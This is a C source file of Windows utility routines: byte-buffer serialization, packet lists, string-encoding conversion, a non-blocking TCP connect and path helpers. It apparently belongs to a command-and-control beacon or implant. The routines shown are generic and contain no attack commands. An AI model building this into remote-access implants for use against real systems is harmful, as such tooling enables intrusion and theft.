#define BEACON_NO_FORMAT_REDIRECT
#include "beacon_common.h"

#include <stdarg.h>
#include <limits.h>

/* ===== 动态解析 CRT 格式化函数 ===== */

typedef INT (__cdecl* PFN_VSCPRINTF)(const CHAR*, va_list);
typedef INT (__cdecl* PFN_VSNPRINTF)(CHAR*, SIZE_T, const CHAR*, va_list);
typedef INT (__cdecl* PFN_VSWPRINTF_S)(WCHAR*, SIZE_T, const WCHAR*, va_list);
typedef INT (__cdecl* PFN_VSNWPRINTF)(WCHAR*, SIZE_T, const WCHAR*, va_list);

static PFN_VSCPRINTF   pfn_vscprintf   = NULL;
static PFN_VSNPRINTF   pfn_vsnprintf   = NULL;
static PFN_VSWPRINTF_S pfn_vswprintf_s = NULL;
static PFN_VSNWPRINTF  pfn_vsnwprintf  = NULL;
static INIT_ONCE       g_fmt_init_once = INIT_ONCE_STATIC_INIT;

/* 解析 CRT 格式化函数（ucrtbase 优先，回退 msvcrt） */
static BOOL CALLBACK FmtResolveOnce(PINIT_ONCE init_once, PVOID parameter, PVOID* context)
{
    HMODULE h;

    (VOID)init_once;
    (VOID)parameter;
    (VOID)context;

    h = LoadLibraryA("ucrtbase.dll");
    if (h) {
        if (!pfn_vscprintf)   pfn_vscprintf   = (PFN_VSCPRINTF)GetProcAddress(h, "_vscprintf");
        if (!pfn_vsnprintf)   pfn_vsnprintf   = (PFN_VSNPRINTF)GetProcAddress(h, "vsnprintf");
        if (!pfn_vswprintf_s) pfn_vswprintf_s = (PFN_VSWPRINTF_S)GetProcAddress(h, "vswprintf_s");
    }

    h = LoadLibraryA("msvcrt.dll");
    if (h) {
        if (!pfn_vscprintf)  pfn_vscprintf  = (PFN_VSCPRINTF)GetProcAddress(h, "_vscprintf");
        if (!pfn_vsnprintf)  pfn_vsnprintf  = (PFN_VSNPRINTF)GetProcAddress(h, "vsnprintf");
        if (!pfn_vsnprintf)  pfn_vsnprintf  = (PFN_VSNPRINTF)GetProcAddress(h, "_vsnprintf");
        if (!pfn_vsnwprintf) pfn_vsnwprintf = (PFN_VSNWPRINTF)GetProcAddress(h, "_vsnwprintf");
    }

    return TRUE;
}

static VOID FmtResolve(VOID)
{
    InitOnceExecuteOnce(&g_fmt_init_once, FmtResolveOnce, NULL, NULL);
}

/* 动态解析版 _vscprintf */
INT FmtVscprintfA(const CHAR* fmt, va_list ap)
{
    FmtResolve();
    if (pfn_vscprintf) return pfn_vscprintf(fmt, ap);
    return -1;
}

/* 动态解析版 vsnprintf */
INT FmtVsnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, va_list ap)
{
    INT n;
    FmtResolve();
    if (pfn_vsnprintf) {
        n = pfn_vsnprintf(dst, dst_len, fmt, ap);
        if (dst && dst_len) dst[dst_len - 1] = '\0';
        return n;
    }
    if (dst && dst_len) dst[0] = '\0';
    return -1;
}

/* 动态解析版 snprintf */
INT FmtSnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, ...)
{
    va_list ap;
    INT n;
    FmtResolve();
    va_start(ap, fmt);
    n = FmtVsnprintfA(dst, dst_len, fmt, ap);
    va_end(ap);
    return n;
}

/* 动态解析版 swprintf_s / _vsnwprintf */
INT FmtSnprintfW(WCHAR* dst, SIZE_T dst_len, const WCHAR* fmt, ...)
{
    va_list ap;
    INT n = -1;
    FmtResolve();
    va_start(ap, fmt);
    if (pfn_vswprintf_s) {
        n = pfn_vswprintf_s(dst, dst_len, fmt, ap);
    } else if (pfn_vsnwprintf) {
        n = pfn_vsnwprintf(dst, dst_len, fmt, ap);
        if (dst && dst_len) dst[dst_len - 1] = L'\0';
    }
    va_end(ap);
    if (n < 0 && dst && dst_len) dst[0] = L'\0';
    return n;
}

/* 初始化 ByteBuf */
VOID BbInit(ByteBuf* b)
{
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
}

/* 释放 ByteBuf */
VOID BbFree(ByteBuf* b)
{
    if (b->data) {
        SecureZeroMemory(b->data, b->len);
        HeapFree(GetProcessHeap(), 0, (b->data));
    }
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
}

/* 预留空间 */
INT BbReserve(ByteBuf* b, SIZE_T need)
{
    BYTE8* p;
    SIZE_T cap;

    if (need <= b->cap) {
        return 1;
    }

    /* 从 256 开始倍增容量直到满足需求 */
    cap = b->cap ? b->cap : 256;
    while (cap < need) {
        if (cap > ((SIZE_T)-1) / 2) {
            return 0; /* overflow */
        }
        cap *= 2;
    }

    p = (BYTE8*)(b->data ? HeapReAlloc(GetProcessHeap(), 0, (b->data), (cap)) : HeapAlloc(GetProcessHeap(), 0, (cap)));
    if (!p) {
        return 0;
    }

    b->data = p;
    b->cap = cap;
    return 1;
}

/* 追加原始字节 */
INT BbAppend(ByteBuf* b, const VOID* data, SIZE_T len)
{
    if (len == 0) {
        return 1;
    }
    if (!data || len > ((SIZE_T)-1) - b->len || !BbReserve(b, b->len + len)) {
        return 0;
    }
    memcpy(b->data + b->len, data, len);
    b->len += len;
    return 1;
}

/* 追加 UINT8 */
INT BbU8(ByteBuf* b, UINT8 v)
{
    return BbAppend(b, &v, 1);
}

/* 追加 UINT16（大端序） */
INT BbU16(ByteBuf* b, UINT16 v)
{
    BYTE8 d[2];
    d[0] = (BYTE8)((v >> 8) & 0xff);
    d[1] = (BYTE8)(v & 0xff);
    return BbAppend(b, d, sizeof(d));
}

/* 追加 UINT32（大端序） */
INT BbU32(ByteBuf* b, UINT32 v)
{
    BYTE8 d[4];
    d[0] = (BYTE8)((v >> 24) & 0xff);
    d[1] = (BYTE8)((v >> 16) & 0xff);
    d[2] = (BYTE8)((v >> 8) & 0xff);
    d[3] = (BYTE8)(v & 0xff);
    return BbAppend(b, d, sizeof(d));
}

/* 追加 UINT64（大端序） */
INT BbU64(ByteBuf* b, UINT64 v)
{
    BYTE8 d[8];
    INT i;

    for (i = 0; i < 8; ++i) {
        d[i] = (BYTE8)((v >> (56 - i * 8)) & 0xff);
    }
    return BbAppend(b, d, sizeof(d));
}

/* 追加字节序列（带长度前缀） */
INT BbBytes(ByteBuf* b, const VOID* data, SIZE_T len)
{
    if (len > 0xffffffffu) {
        return 0;
    }
    return BbU32(b, (UINT32)len) && BbAppend(b, data, len);
}

/* 追加字符串（带长度前缀） */
INT BbString(ByteBuf* b, const CHAR* s)
{
    SIZE_T len = s ? strlen(s) : 0;

    /* 写入长度（包含空终止符，空字符串为 0） */
    if (!BbU32(b, (UINT32)(len ? len + 1 : 0))) {
        return 0;
    }
    if (len && !BbAppend(b, s, len)) {
        return 0;
    }
    /* 为非空字符串追加空终止符 */
    if (len) {
        BYTE8 z = 0;
        return BbAppend(b, &z, 1);
    }
    return 1;
}

/* 格式化追加（printf 风格） */
INT BbPrintf(ByteBuf* b, const CHAR* fmt, ...)
{
    va_list ap;
    va_list measure;
    INT n;
    SIZE_T old;

    /* 测量格式化后的长度 */
    va_start(ap, fmt);
    va_copy(measure, ap);
    n = FmtVscprintfA(fmt, measure);
    va_end(measure);

    if (n <= 0) {
        va_end(ap);
        return n == 0;
    }

    old = b->len;
    if ((SIZE_T)n > ((SIZE_T)-1) - old - 1 || !BbReserve(b, old + (SIZE_T)n + 1)) {
        va_end(ap);
        return 0;
    }

    /* 直接格式化到缓冲区 */
    FmtVsnprintfA((CHAR*)b->data + old, (SIZE_T)n + 1, fmt, ap);
    va_end(ap);

    b->len += (SIZE_T)n;
    return 1;
}

/* 从文本创建 ByteBuf */
ByteBuf BbFromText(const CHAR* s)
{
    ByteBuf b;
    BbInit(&b);
    if (s) {
        BbAppend(&b, s, strlen(s));
    }
    return b;
}

/* 在堆上复制 ANSI 字符串 */
CHAR* HeapStrDupA(const CHAR* s)
{
    SIZE_T len;
    CHAR* out;

    if (!s) {
        s = "";
    }

    len = strlen(s);
    out = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (!out) {
        return NULL;
    }

    if (len) {
        memcpy(out, s, len);
    }
    return out;
}

/* 在堆上复制宽字符串 */
WCHAR* HeapStrDupW(const WCHAR* s)
{
    SIZE_T len;
    WCHAR* out;

    if (!s) {
        s = L"";
    }

    len = wcslen(s);
    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (len + 1) * sizeof(WCHAR));
    if (!out) {
        return NULL;
    }

    if (len) {
        memcpy(out, s, len * sizeof(WCHAR));
    }
    return out;
}

/* 初始化数据包列表 */
VOID PlistInit(PacketList* list)
{
    list->items = NULL;
    list->count = 0;
    list->cap = 0;
    list->items_are_final = 0;
    list->should_exit = 0;
}

/* 释放数据包列表 */
VOID PlistFree(PacketList* list)
{
    SIZE_T i;

    for (i = 0; i < list->count; ++i) {
        BbFree(&list->items[i]);
    }
    HeapFree(GetProcessHeap(), 0, (list->items));
    list->items = NULL;
    list->count = 0;
    list->cap = 0;
}

/* 追加数据包到列表 */
INT PlistAdd(PacketList* list, ByteBuf item)
{
    ByteBuf* p;
    SIZE_T cap;

    /* 数组满时扩展（从 4 开始倍增） */
    if (list->count == list->cap) {
        if (list->cap) {
            if (list->cap > ((SIZE_T)-1) / 2) {
                BbFree(&item);
                return 0;
            }
            cap = list->cap * 2;
        } else {
            cap = 4;
        }
        if (cap > ((SIZE_T)-1) / sizeof(ByteBuf)) {
            BbFree(&item);
            return 0;
        }
        p = (ByteBuf*)(list->items ? HeapReAlloc(GetProcessHeap(), 0, (list->items), (cap * sizeof(ByteBuf))) : HeapAlloc(GetProcessHeap(), 0, (cap * sizeof(ByteBuf))));
        if (!p) {
            BbFree(&item);
            return 0;
        }
        list->items = p;
        list->cap = cap;
    }

    list->items[list->count++] = item;
    return 1;
}

/* UTF-8 转宽字符串 */
WCHAR* Utf8ToWide(const CHAR* s)
{
    INT len;
    WCHAR* out;

    if (!s) {
        s = "";
    }

    len = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (len <= 0) {
        return HeapStrDupW(L"");
    }

    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len)*(sizeof(WCHAR)));
    if (!out) {
        return NULL;
    }

    MultiByteToWideChar(CP_UTF8, 0, s, -1, out, len);
    return out;
}

/* 宽字符串转 UTF-8 */
CHAR* WideToUtf8(const WCHAR* s)
{
    INT len;
    CHAR* out;

    if (!s) {
        s = L"";
    }

    len = WideCharToMultiByte(CP_UTF8, 0, s, -1, NULL, 0, NULL, NULL);
    if (len <= 0) {
        return HeapStrDupA("");
    }

    out = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len)*(1));
    if (!out) {
        return NULL;
    }

    WideCharToMultiByte(CP_UTF8, 0, s, -1, out, len, NULL, NULL);
    return out;
}

/* 系统编码转 UTF-8 */
CHAR* SystemToUtf8(const CHAR* data, UINT cp)
{
    return SystemBytesToUtf8((const BYTE8*)data, data ? strlen(data) : 0, cp);
}

/* 验证原始字节是否构成有效的 UTF-8 序列 */
static INT IsValidUtf8Bytes(const BYTE8* data, SIZE_T len)
{
    SIZE_T i = 0;

    while (i < len) {
        BYTE8 c = data[i];
        SIZE_T need;
        UINT32 code;

        /* ASCII 字节 -- 单字节，跳过 */
        if (c < 0x80) {
            ++i;
            continue;
        }

        /* 确定序列长度和初始码点位 */
        if ((c & 0xe0) == 0xc0) {
            need = 2;
            code = c & 0x1f;
            if (code == 0) return 0; /* overlong */
        } else if ((c & 0xf0) == 0xe0) {
            need = 3;
            code = c & 0x0f;
        } else if ((c & 0xf8) == 0xf0) {
            need = 4;
            code = c & 0x07;
        } else {
            return 0; /* invalid leading byte */
        }

        /* 检查完整序列是否适合缓冲区 */
        if (i + need > len) {
            return 0;
        }

        /* 验证续接字节并组装码点 */
        {
            SIZE_T j;
            for (j = 1; j < need; ++j) {
                if ((data[i + j] & 0xc0) != 0x80) {
                    return 0; /* not a valid continuation byte */
                }
                code = (code << 6) | (data[i + j] & 0x3f);
            }
        }

        /* 拒绝过长编码和代理对 */
        if ((need == 2 && code < 0x80) ||
            (need == 3 && code < 0x800) ||
            (need == 4 && (code < 0x10000 || code > 0x10ffff)) ||
            (code >= 0xd800 && code <= 0xdfff)) {
            return 0;
        }

        i += need;
    }
    return 1;
}

/* 系统编码字节流转 UTF-8 */
CHAR* SystemBytesToUtf8(const BYTE8* data, SIZE_T len, UINT cp)
{
    INT wlen;
    INT ulen;
    WCHAR* wide;
    CHAR* utf8;

    if (!data || len == 0) {
        return HeapStrDupA("");
    }

    /* 若已是有效的 UTF-8，直接复制 */
    if (IsValidUtf8Bytes(data, len)) {
        utf8 = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len + 1)*(1));
        if (!utf8) {
            return HeapStrDupA("");
        }
        memcpy(utf8, data, len);
        return utf8;
    }

    /* 拒绝过大的输入 */
    if (len > INT_MAX) {
        return HeapStrDupA("");
    }

    /* 将源编码转换为宽字符串 */
    wlen = MultiByteToWideChar(cp, 0, (LPCCH)data, (INT)len, NULL, 0);
    if (wlen <= 0) {
        /* 转换失败 -- 作为回退复制原始字节 */
        utf8 = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len + 1)*(1));
        if (!utf8) {
            return HeapStrDupA("");
        }
        memcpy(utf8, data, len);
        return utf8;
    }

    wide = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)((SIZE_T)wlen + 1)*(sizeof(WCHAR)));
    if (!wide) {
        return HeapStrDupA("");
    }

    MultiByteToWideChar(cp, 0, (LPCCH)data, (INT)len, wide, wlen);

    /* 将宽字符串转换为 UTF-8 */
    ulen = WideCharToMultiByte(CP_UTF8, 0, wide, wlen, NULL, 0, NULL, NULL);
    utf8 = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)((SIZE_T)(ulen > 0 ? ulen : 0) + 1)*(1));
    if (utf8 && ulen > 0) {
        WideCharToMultiByte(CP_UTF8, 0, wide, wlen, utf8, ulen, NULL, NULL);
    }

    HeapFree(GetProcessHeap(), 0, (wide));
    return utf8 ? utf8 : HeapStrDupA("");
}

/* 字节转十六进制字符串 */
VOID HexEncode(const BYTE8* data, SIZE_T len, CHAR* out, SIZE_T out_len)
{
    static const CHAR* h = "0123456789abcdef";
    SIZE_T i;

    if (out_len == 0) {
        return;
    }

    for (i = 0; i < len && i * 2 + 2 < out_len; ++i) {
        out[i * 2]     = h[(data[i] >> 4) & 0xf];
        out[i * 2 + 1] = h[data[i] & 0xf];
    }
    out[i * 2] = 0;
}

/* 获取 Unix 时间戳 */
UINT64 GetUnixTimestamp(VOID)
{
    FILETIME ft;
    ULARGE_INTEGER li;

    GetSystemTimeAsFileTime(&ft);
    li.LowPart = ft.dwLowDateTime;
    li.HighPart = ft.dwHighDateTime;

    /* 从 1601 年以来的 100 纳秒间隔转换为 1970 年以来的秒数 */
    return (UINT64)((li.QuadPart - 116444736000000000ULL) / 10000000ULL);
}

/* 读取大端 uint16 */
UINT16 BeReadU16(const BYTE8* p)
{
    return (UINT16)(((UINT16)p[0] << 8) | (UINT16)p[1]);
}

/* 读取大端 uint32 */
UINT32 BeReadU32(const BYTE8* p)
{
    return ((UINT32)p[0] << 24) |
           ((UINT32)p[1] << 16) |
           ((UINT32)p[2] << 8)  |
           (UINT32)p[3];
}

/* 写入大端 uint16 */
VOID BeWriteU16(BYTE8* p, UINT16 v)
{
    p[0] = (BYTE8)((v >> 8) & 0xff);
    p[1] = (BYTE8)(v & 0xff);
}

/* 写入大端 uint32 */
VOID BeWriteU32(BYTE8* p, UINT32 v)
{
    p[0] = (BYTE8)((v >> 24) & 0xff);
    p[1] = (BYTE8)((v >> 16) & 0xff);
    p[2] = (BYTE8)((v >> 8) & 0xff);
    p[3] = (BYTE8)(v & 0xff);
}

/*
 * 带超时的非阻塞 TCP 连接。
 * 统一 cascade_io_tcp.c 与 tcp_external.c 两处的 connect+select 实现。
 * 返回 0 表示成功，非 0 为 WSA 错误码（含 WSAETIMEDOUT）。
 */
INT TcpConnectNonblocking(SOCKET s, const struct sockaddr* addr, INT addr_len, INT timeout_ms)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    INT rc;
    INT err;
    fd_set write_set;
    fd_set except_set;
    TIMEVAL tv;
    INT so_error = 0;
    INT so_len = sizeof(so_error);

    if (timeout_ms <= 0) timeout_ms = 10000;

    ioctlsocket(s, FIONBIO, &nonblock);
    rc = connect(s, addr, addr_len);
    if (rc == 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    err = WSAGetLastError();
    if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS && err != WSAEINVAL && err != WSAEALREADY) {
        return err;
    }

    FD_ZERO(&write_set);
    FD_ZERO(&except_set);
    FD_SET(s, &write_set);
    FD_SET(s, &except_set);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    rc = select(0, NULL, &write_set, &except_set, &tv);
    if (rc == 0) return WSAETIMEDOUT;
    if (rc == SOCKET_ERROR) return WSAGetLastError();

    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (CHAR*)&so_error, &so_len) == SOCKET_ERROR) {
        return WSAGetLastError();
    }
    if (so_error != 0) return so_error;

    ioctlsocket(s, FIONBIO, &blocking);
    return 0;
}

#ifdef _DEBUG
/* 调试构建下格式化输出到 OutputDebugStringA。 */
VOID DebugPrintf(const CHAR* fmt, ...)
{
    CHAR buf[1024];
    va_list ap;

    va_start(ap, fmt);
    FmtVsnprintfA(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    OutputDebugStringA(buf);
}
#else
/* Release 构建中保留空实现，避免调用方条件编译。 */
VOID DebugPrintf(const CHAR* fmt, ...)
{
    (VOID)fmt;
}
#endif

/*
 * 以反斜杠分隔符合并两个路径段。
 * left 为空时返回 right 的副本；left 未以 \ 或 / 结尾时补一个分隔符。
 * filebrowser/zip 两份平行实现的统一体。
 */
WCHAR* PathJoinWide(const WCHAR* left, const WCHAR* right)
{
    SIZE_T left_len = left ? wcslen(left) : 0;
    SIZE_T right_len = right ? wcslen(right) : 0;
    INT need_sep;
    WCHAR* out;

    if (left_len == 0) {
        return HeapStrDupW(right ? right : L"");
    }

    need_sep = left[left_len - 1] != L'\\' && left[left_len - 1] != L'/';
    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                            (left_len + (need_sep ? 1u : 0u) + right_len + 1u) * sizeof(WCHAR));
    if (!out) {
        return NULL;
    }
    wcscpy_s(out, left_len + 1u, left);
    if (need_sep) {
        out[left_len++] = L'\\';
    }
    if (right_len) {
        wcscpy_s(out + left_len, right_len + 1u, right);
    }
    return out;
}

/*
 * 将路径解析为完整的绝对路径；失败或空输入时退回原串副本。
 * 与 zip 版本的差异：本函数不做尾部斜杠剥离（各调用方自行处理），
 * filebrowser 版本本就未剥离，行为保持一致。
 */
WCHAR* PathFullWide(const WCHAR* path)
{
    DWORD need;
    WCHAR* out;

    if (!path || !*path) {
        return HeapStrDupW(L"");
    }

    need = GetFullPathNameW(path, 0, NULL, NULL);
    if (need == 0) {
        return HeapStrDupW(path);
    }

    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                            ((SIZE_T)need + 1) * sizeof(WCHAR));
    if (!out) {
        return NULL;
    }
    if (GetFullPathNameW(path, need, out, NULL) == 0) {
        HeapFree(GetProcessHeap(), 0, out);
        return HeapStrDupW(path);
    }
    return out;
}

/* 将 Win32 文件属性转换为 Unix 风格模式字符串（fs/filebrowser 平行实现的统一体） */
VOID FsModeStringFromAttrs(DWORD attrs, CHAR out[16])
{
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        strcpy_s(out, 16, "drwxrwxrwx");
    } else if (attrs & FILE_ATTRIBUTE_READONLY) {
        strcpy_s(out, 16, "-r--r--r--");
    } else {
        strcpy_s(out, 16, "-rw-rw-rw-");
    }
}
